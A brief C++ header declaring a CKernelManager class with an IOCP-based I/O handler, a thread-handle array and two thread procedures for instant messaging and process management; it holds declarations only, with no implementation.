#pragma once
#include "Manager.h"
class CKernelManager : public CManager
{
public:
	CKernelManager(CIocpClient* IocpClient);
	~CKernelManager();
	void HandleIo(PBYTE BufferData, ULONG_PTR BufferLength);
private:
	//功能线程
	HANDLE m_ThreadHandle[0x1000];
	int    m_ThreadHandleCount;


};

DWORD WINAPI InstantMessageProcedure(LPVOID ParameterData);
DWORD WINAPI ProcessManagerProcedure(LPVOID ParameterData);